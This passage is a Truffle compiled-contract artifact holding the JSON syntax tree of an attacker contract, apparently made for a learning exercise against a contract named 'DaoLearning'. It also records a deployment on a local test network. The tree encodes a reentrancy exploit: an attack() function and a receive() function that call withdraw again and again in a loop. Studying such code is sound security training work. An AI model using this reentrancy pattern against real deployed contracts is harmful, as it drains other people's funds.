                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 34,
                        "name": "DaoLearning",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 254,
                        "src": "1359:11:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_DaoLearning_$254_$",
                          "typeString": "type(contract DaoLearning)"
                        }
                      },
                      "id": 36,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1359:17:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_DaoLearning_$254",
                        "typeString": "contract DaoLearning"
                      }
                    },
                    "src": "1353:23:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_DaoLearning_$254",
                      "typeString": "contract DaoLearning"
                    }
                  },
                  "id": 38,
                  "nodeType": "ExpressionStatement",
                  "src": "1353:23:0"
                }
              ]
            },
            "functionSelector": "2f7b73de",
            "id": 40,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "initializeDao",
            "nameLocation": "1307:13:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 31,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 30,
                  "mutability": "mutable",
                  "name": "addr",
                  "nameLocation": "1329:4:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 40,
                  "src": "1321:12:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 29,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "1321:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "1320:14:0"
            },
            "returnParameters": {
              "id": 32,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1342:0:0"
            },
            "scope": 123,
            "src": "1298:86:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 53,
              "nodeType": "Block",
              "src": "1494:55:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "argumentTypes": [],
                        "expression": {
                          "id": 43,
                          "name": "dao",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 13,
                          "src": "1505:3:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_DaoLearning_$254",
                            "typeString": "contract DaoLearning"
                          }
                        },
                        "id": 45,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "mintTokens",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 185,
                        "src": "1505:14:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_payable$__$returns$__$",
                          "typeString": "function () payable external"
                        }
                      },
                      "id": 50,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "names": [
                        "value"
                      ],
                      "nodeType": "FunctionCallOptions",
                      "options": [
                        {
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 49,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "expression": {
                              "id": 46,
                              "name": "msg",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 4294967281,
                              "src": "1527:3:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_magic_message",
                                "typeString": "msg"
                              }
                            },
                            "id": 47,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "value",
                            "nodeType": "MemberAccess",
                            "src": "1527:9:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "-",
                          "rightExpression": {
                            "hexValue": "31",
                            "id": 48,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "1537:1:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_1_by_1",
                              "typeString": "int_const 1"
                            },
                            "value": "1"
                          },
                          "src": "1527:11:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        }
                      ],
                      "src": "1505:34:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
                        "typeString": "function () payable external"
                      }
                    },
                    "id": 51,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1505:36:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 52,
                  "nodeType": "ExpressionStatement",
                  "src": "1505:36:0"
                }
              ]
            },
            "functionSelector": "341b44e1",
            "id": 54,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "depositToDao",
            "nameLocation": "1464:12:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 41,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1476:2:0"
            },
            "returnParameters": {
              "id": 42,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1494:0:0"
            },
            "scope": 123,
            "src": "1455:94:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 63,
              "nodeType": "Block",
              "src": "1660:44:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "id": 59,
                        "name": "dao",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 13,
                        "src": "1678:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_DaoLearning_$254",
                          "typeString": "contract DaoLearning"
                        }
                      },
                      "id": 60,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "checkBalance",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 197,
                      "src": "1678:16:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_view$__$returns$_t_uint64_$",
                        "typeString": "function () view external returns (uint64)"
                      }
                    },
                    "id": 61,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1678:18:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint64",
                      "typeString": "uint64"
                    }
                  },
                  "functionReturnParameters": 58,
                  "id": 62,
                  "nodeType": "Return",
                  "src": "1671:25:0"
                }
              ]
            },
            "functionSelector": "31c38310",
            "id": 64,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "myDaoBalance",
            "nameLocation": "1616:12:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 55,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1628:2:0"
            },
            "returnParameters": {
              "id": 58,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 57,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 64,
                  "src": "1652:6:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint64",
                    "typeString": "uint64"
                  },
                  "typeName": {
                    "id": 56,
                    "name": "uint64",
                    "nodeType": "ElementaryTypeName",
                    "src": "1652:6:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint64",
                      "typeString": "uint64"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "1651:8:0"
            },
            "scope": 123,
            "src": "1607:97:0",
            "stateMutability": "view",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 74,
              "nodeType": "Block",
              "src": "1814:47:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [],
                        "expression": {
                          "argumentTypes": [],
                          "id": 70,
                          "name": "myDaoBalance",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 64,
                          "src": "1838:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_internal_view$__$returns$_t_uint64_$",
                            "typeString": "function () view returns (uint64)"
                          }
                        },
                        "id": 71,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1838:14:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint64",
                          "typeString": "uint64"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint64",
                          "typeString": "uint64"
                        }
                      ],
                      "expression": {
                        "id": 67,
                        "name": "dao",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 13,
                        "src": "1825:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_DaoLearning_$254",
                          "typeString": "contract DaoLearning"
                        }
                      },
                      "id": 69,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "withdraw",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 253,
                      "src": "1825:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_uint64_$returns$__$",
                        "typeString": "function (uint64) external"
                      }
                    },
                    "id": 72,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1825:28:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 73,
                  "nodeType": "ExpressionStatement",
                  "src": "1825:28:0"
                }
              ]
            },
            "functionSelector": "5e286c7b",
            "id": 75,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "withdrawFromDao",
            "nameLocation": "1789:15:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 65,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1804:2:0"
            },
            "returnParameters": {
              "id": 66,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1814:0:0"
            },
            "scope": 123,
            "src": "1780:81:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 89,
              "nodeType": "Block",
              "src": "1972:95:0",
              "statements": [
                {
                  "expression": {
                    "id": 80,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 78,
                      "name": "attacking",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 16,
                      "src": "1983:9:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "hexValue": "74727565",
                      "id": 79,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "bool",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "1995:4:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      },
                      "value": "true"
                    },
                    "src": "1983:16:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 81,
                  "nodeType": "ExpressionStatement",
                  "src": "1983:16:0"
                },
                {
                  "expression": {
                    "id": 84,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 82,
                      "name": "current_iteration",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 8,
                      "src": "2010:17:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint64",
                        "typeString": "uint64"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "hexValue": "31",
                      "id": 83,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "2030:1:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_1_by_1",
                        "typeString": "int_const 1"
                      },
                      "value": "1"
                    },
                    "src": "2010:21:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint64",
                      "typeString": "uint64"
                    }
                  },
                  "id": 85,
                  "nodeType": "ExpressionStatement",
                  "src": "2010:21:0"
                },
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "id": 86,
                      "name": "withdrawFromDao",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 75,
                      "src": "2042:15:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$__$returns$__$",
                        "typeString": "function ()"
                      }
                    },
                    "id": 87,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2042:17:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 88,
                  "nodeType": "ExpressionStatement",
                  "src": "2042:17:0"
                }
              ]
            },
            "functionSelector": "9e5faafc",
            "id": 90,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "attack",
            "nameLocation": "1956:6:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 76,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1962:2:0"
            },
            "returnParameters": {
              "id": 77,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1972:0:0"
            },
            "scope": 123,
            "src": "1947:120:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 121,
              "nodeType": "Block",
              "src": "2181:511:0",
              "statements": [
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    },
                    "id": 97,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 93,
                      "name": "attacking",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 16,
                      "src": "2246:9:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "&&",
                    "rightExpression": {
                      "commonType": {
                        "typeIdentifier": "t_uint64",
                        "typeString": "uint64"
                      },
                      "id": 96,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "id": 94,
                        "name": "current_iteration",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 8,
                        "src": "2259:17:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint64",
                          "typeString": "uint64"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "<",
                      "rightExpression": {
                        "id": 95,
                        "name": "ATTACK_LOOP_LIMIT",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 5,
                        "src": "2279:17:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint64",
                          "typeString": "uint64"
                        }
                      },
                      "src": "2259:37:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      }
                    },
                    "src": "2246:50:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 120,
                  "nodeType": "IfStatement",
                  "src": "2242:443:0",
                  "trueBody": {
                    "id": 119,
                    "nodeType": "Block",
                    "src": "2298:387:0",
                    "statements": [
                      {
                        "expression": {
                          "id": 99,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "nodeType": "UnaryOperation",
                          "operator": "++",
                          "prefix": false,
                          "src": "2313:19:0",
                          "subExpression": {
                            "id": 98,
                            "name": "current_iteration",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 8,
                            "src": "2313:17:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint64",
                              "typeString": "uint64"
                            }
                          },
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint64",
                            "typeString": "uint64"
                          }
                        },
                        "id": 100,
                        "nodeType": "ExpressionStatement",
                        "src": "2313:19:0"
                      },
                      {
                        "condition": {
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 108,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "expression": {
                              "arguments": [
                                {
                                  "id": 103,
                                  "name": "dao",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 13,
                                  "src": "2427:3:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_contract$_DaoLearning_$254",
                                    "typeString": "contract DaoLearning"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_contract$_DaoLearning_$254",
                                    "typeString": "contract DaoLearning"
                                  }
                                ],
                                "id": 102,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "2419:7:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 101,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "2419:7:0",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 104,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "2419:12:0",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            "id": 105,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "balance",
                            "nodeType": "MemberAccess",
                            "src": "2419:20:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": ">=",
                          "rightExpression": {
                            "expression": {
                              "id": 106,
                              "name": "msg",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 4294967281,
                              "src": "2443:3:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_magic_message",
                                "typeString": "msg"
                              }
                            },
                            "id": 107,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "value",
                            "nodeType": "MemberAccess",
                            "src": "2443:9:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "2419:33:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "falseBody": {
                          "id": 117,
                          "nodeType": "Block",
                          "src": "2548:126:0",
                          "statements": [
                            {
                              "expression": {
                                "id": 115,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "lValueRequested": false,
                                "leftHandSide": {
                                  "id": 113,
                                  "name": "attacking",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 16,
                                  "src": "2641:9:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_bool",
                                    "typeString": "bool"
                                  }
                                },
                                "nodeType": "Assignment",
                                "operator": "=",
                                "rightHandSide": {
                                  "hexValue": "66616c7365",
                                  "id": 114,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "kind": "bool",
                                  "lValueRequested": false,
                                  "nodeType": "Literal",
                                  "src": "2653:5:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_bool",
                                    "typeString": "bool"
                                  },
                                  "value": "false"
                                },
                                "src": "2641:17:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_bool",
                                  "typeString": "bool"
                                }
                              },
                              "id": 116,
                              "nodeType": "ExpressionStatement",
                              "src": "2641:17:0"
                            }
                          ]
                        },
                        "id": 118,
                        "nodeType": "IfStatement",
                        "src": "2415:259:0",
                        "trueBody": {
                          "id": 112,
                          "nodeType": "Block",
                          "src": "2454:88:0",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [],
                                "expression": {
                                  "argumentTypes": [],
                                  "id": 109,
                                  "name": "withdrawFromDao",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 75,
                                  "src": "2509:15:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_internal_nonpayable$__$returns$__$",
                                    "typeString": "function ()"
                                  }
                                },
                                "id": 110,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "2509:17:0",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 111,
                              "nodeType": "ExpressionStatement",
                              "src": "2509:17:0"
                            }
                          ]
                        }
                      }
                    ]
                  }
                }
              ]
            },
            "id": 122,
            "implemented": true,
            "kind": "receive",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 91,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2161:2:0"
            },
            "returnParameters": {
              "id": 92,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2181:0:0"
            },
            "scope": 123,
            "src": "2154:538:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 124,
        "src": "741:1956:0",
        "usedErrors": []
      }
    ],
    "src": "42:2655:0"
  },
  "compiler": {
    "name": "solc",
    "version": "0.8.14+commit.80d49f37.Emscripten.clang"
  },
  "networks": {
    "5777": {
      "events": {},
      "links": {},
      "address": "0x3a1a72EeB83Ad380050Be5f2b1502B560fAb4D20",
      "transactionHash": "0xf8e79efc61cf1f2e7e2d6517ba83fa2db4ffd2f73f7d3cf62e789e76f9ac63bf"
    }
  },
  "schemaVersion": "3.4.7",
  "updatedAt": "2022-06-23T02:38:38.035Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}